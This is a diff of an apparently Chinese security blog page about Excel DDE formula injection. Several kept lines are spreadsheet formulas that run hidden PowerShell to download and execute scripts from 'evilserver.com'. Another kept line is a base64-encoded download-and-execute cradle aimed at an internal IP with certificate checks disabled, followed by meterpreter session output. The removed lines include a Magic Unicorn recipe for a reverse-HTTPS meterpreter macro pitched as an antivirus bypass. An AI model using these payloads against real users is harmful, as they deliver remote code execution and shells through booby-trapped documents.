@@ -51,7 +51,7 @@
 
 <meta itemprop="datePublished" content="2017-12-19T21:10:32&#43;00:00" />
 <meta itemprop="dateModified" content="2017-12-19T21:10:32&#43;00:00" />
-<meta itemprop="wordCount" content="1207">
+<meta itemprop="wordCount" content="1083">
 
 
 
@@ -130,7 +130,6 @@
 <li><a href="#0x04-使用python等开启http服务器">0x04 使用python等开启http服务器</a></li>
 <li><a href="#0x05-新建一个execl-在任意处粘贴以下内容保存即可">0x05 新建一个execl.在任意处粘贴以下内容保存即可</a></li>
 <li><a href="#0x06-打开execl">0x06 打开execl</a></li>
-<li><a href="#0x07-彩蛋">0x07 彩蛋</a></li>
 </ul>
 </nav>
   </div>
@@ -154,16 +153,12 @@
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">=</span><span class="n">cmd</span><span class="p">|</span><span class="s1">&#39;/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\&#34;http://evilserver.com/sp.base64\&#34;);powershell -e $e&#39;</span><span class="p">!</span><span class="n">A1</span>
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">=</span><span class="n">cmd</span><span class="p">|</span><span class="s1">&#39;/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(&#34;http://evilserver.com/sp.base64\&#34;);powershell -e $e&#39;</span><span class="p">!</span><span class="n">A1</span>
 
-<span class="n">解码后的脚本</span>
-<span class="p">=</span><span class="n">cmd</span><span class="p">|</span><span class="s1">&#39;/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\&#34;http://evilserver.com/sp.ps1\&#34;);IEX $e&#39;</span><span class="p">!</span><span class="n">A1</span>
+<span class="p">=</span><span class="n">cmd</span><span class="p">|</span><span class="s1">&#39;/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(&#34;http://evilserver.com/sp.ps1&#34;);IEX $e&#39;</span><span class="p">!</span><span class="n">A1</span>
 
-<span class="n">使用bat</span>
 <span class="p">=</span><span class="n">cmd</span><span class="p">|</span><span class="s1">&#39;/c \\evilserver.com\sp.bat;IEX $e&#39;</span><span class="p">!</span><span class="n">A1</span></code></pre></td></tr></table>
 </div>
 </div>
@@ -211,8 +206,8 @@ powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertifi
 <p>注意:<br />
 powershell中base64编码用utf8转base64会执行失败</p>
 
-<p>utf8 &mdash;&mdash;&mdash;&mdash;&gt;&gt;&gt; base64  False<br />
-utf16-le &mdash;&mdash;&gt;&gt;&gt; base64  True</p>
+<p>utf8        &gt; base64  False<br />
+utf16-le    &gt; base64  True</p>
 
 <p><strong>bash</strong><br />
 <strong>注意</strong>:这里我用的双引号和单引号请区分.上面payload中url是单引号,被我更改成双引号了</p>
@@ -233,18 +228,14 @@ utf16-le &mdash;&mdash;&gt;&gt;&gt; base64  True</p>
 </span><span class="lnt">13
 </span><span class="lnt">14
 </span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># echo &#39;[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$l=new-object net.webclient;$l.proxy=[Net.WebRequest]::GetSystemWebProxy();$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $l.downloadstring(&#34;https://10.10.10.2:8080/QpxuaN&#34;)&#39; |iconv --to-code UTF-16LE|base64</span>
 
 <span class="n">WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAPQB7ACQAdAByAHUAZQB9ADsAJABsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAGwALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAkAGwALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwAxADAALgAxADAALgAxADAALgAyADoAOAAwADgAMAAvAFEAcAB4AHUAYQBOACIAKQAKAA</span>
 
+<span class="n">或者先保存成payload</span><span class="p">.</span><span class="n">txt</span> <span class="p">//</span><span class="n">记得换行</span>
 
-<span class="n">或者</span>
-
-<span class="n">先保存成payload</span><span class="p">.</span><span class="n">txt</span> <span class="p">//</span><span class="n">记得换行</span>
 <span class="no">[System.Net.ServicePointManager]</span><span class="p">::</span><span class="n">ServerCertificateValidationCallback</span><span class="p">={</span><span class="nv">$true</span><span class="p">};</span>
 <span class="nv">$l</span><span class="p">=</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">;</span>
 <span class="nv">$l</span><span class="p">.</span><span class="n">proxy</span><span class="p">=</span><span class="no">[Net.WebRequest]</span><span class="p">::</span><span class="n">GetSystemWebProxy</span><span class="p">();</span>
@@ -419,48 +410,11 @@ meterpreter &gt; getuid
 Server username: X\evi1ox</pre></td></tr></table>
 </div>
 </div>
-<h1 id="0x07-彩蛋">0x07 彩蛋</h1>
-
-<p>使用<a href="https://github.com/trustedsec/unicorn.git">Magic Unicorn</a> &mdash;&mdash;  Bypass AV</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">&gt;&gt;&gt;kali_linux
-
-git clone https://github.com/trustedsec/unicorn.git
-<span class="nb">cd</span> unicorn
-python unicorn.py --help
-python unicorn.py windows/meterpreter/reverse_https cdn-01.example.com <span class="m">443</span> macro
-sudo msfconsole -r unicorn.rc
-
-&gt;&gt;&gt;windows
-
-打开 powershell_attack.txt执行即可
-当然这里powershell也可以植入execl中.规避一些waf及av</code></pre></td></tr></table>
-</div>
-</div>
-<p><a href="https://www.youtube.com/watch?v=P-iCeH3qNLw">https://www.youtube.com/watch?v=P-iCeH3qNLw</a></p>
-
-<p><a href="http://staaldraad.github.io/2017/10/23/msword-field-codes/">http://staaldraad.github.io/2017/10/23/msword-field-codes/</a></p>
-
-<p><a href="http://www.exploresecurity.com/from-csv-to-cmd-to-qwerty/">http://www.exploresecurity.com/from-csv-to-cmd-to-qwerty/</a></p>
-
-<p><a href="https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/">https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/</a></p>
-
-<p><a href="https://gist.githubusercontent.com/ssherei/41eab0f2c038ce8b355acf80e9ebb980/raw/0a3b7af41ac8c9a975cfeff2ab21c7eb5e6857a1/Modified-MS16-032.ps1">https://gist.githubusercontent.com/ssherei/41eab0f2c038ce8b355acf80e9ebb980/raw/0a3b7af41ac8c9a975cfeff2ab21c7eb5e6857a1/Modified-MS16-032.ps1</a></p>
+<p><a href="https://www.youtube.com/watch?v=P-iCeH3qNLw">https://www.youtube.com/watch?v=P-iCeH3qNLw</a><br />
+<a href="http://staaldraad.github.io/2017/10/23/msword-field-codes/">http://staaldraad.github.io/2017/10/23/msword-field-codes/</a><br />
+<a href="http://www.exploresecurity.com/from-csv-to-cmd-to-qwerty/">http://www.exploresecurity.com/from-csv-to-cmd-to-qwerty/</a><br />
+<a href="https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/">https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/</a><br />
+<a href="https://gist.githubusercontent.com/ssherei/41eab0f2c038ce8b355acf80e9ebb980/raw/0a3b7af41ac8c9a975cfeff2ab21c7eb5e6857a1/Modified-MS16-032.ps1">https://gist.githubusercontent.com/ssherei/41eab0f2c038ce8b355acf80e9ebb980/raw/0a3b7af41ac8c9a975cfeff2ab21c7eb5e6857a1/Modified-MS16-032.ps1</a></p>
 
     </div>
 
